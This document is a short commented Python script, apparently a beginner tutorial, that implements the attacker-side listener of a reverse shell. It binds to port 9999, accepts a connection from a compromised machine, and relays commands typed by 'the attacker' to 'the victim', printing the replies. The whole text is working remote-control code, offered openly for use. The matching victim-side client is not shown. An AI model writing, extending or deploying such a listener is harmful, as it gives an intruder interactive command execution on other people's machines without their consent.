# importing the libraries for Reverse connection.
import socket
import sys

#creating a socket 
def create_socket():
#use a try and except method for error handling.
    try:
       global s  #create a global variable so that we can use them out of the function also.
       global host  #create a global variable so that we can use them out of the function also.
       global port  #create a global variable so that we can use them out of the function also.

#assigning the values to the global variables.
       s = socket.socket()
       host = ""
       port = 9999

    except socket.error as msg:
       print("socket creation error" + str(msg))

#create a function in order to bind a socket with host ip and port no.
def bind_socket():
#use a try and except method for error handling.
    try:
#in order to use global variables in another function we have to declare them again.
       global s
       global host
       global port

       print("Binding the port " + str(port))  #printing the mssesge.
       s.bind((host,port))  #binding the socket.
       s.listen(5) #this will help to listen for the connection and it will tolerate upto 5 bad connection after that it will throw error.

    except socket.error as msg:
       print("Binding error" + "\n" + "Retrying")
       bind_socket()  #calling the function again if in case it fails to bind. (Recursion)

#function for accepting the socket connection. 
def accept_socket():
    conn,address =  s.accept() #conn - connection and address- ip and port
    print("Connection Established with IP " + address[0] + "  port " + str(address[1]))
    send_command(conn)
    conn.close()

#function for sending the command to victim machine.
def send_command(conn):
    while True:   #infinite loop
        cmd = input()  #taking the input from attacker through cmd.
        if cmd == "quit":   #quit condition.
           conn.close()
           s.close()
           sys.exit()

        if len(str.encode(cmd)) > 0:   #condition to check if attacker input any value.
           conn.send(str.encode(cmd))  #send the attacker input value to victim in byte format. 
           client_response = str(conn.recv(1024),"utf-8")  #recving the response from the victim in string format.
           print(client_response, end="")  #end - used to enter new line and asking for new command to enter by attacker.


#creating a main function which contain all above functions.
def main():

   create_socket()
   bind_socket()
   accept_socket()

#executing the main function.
main()
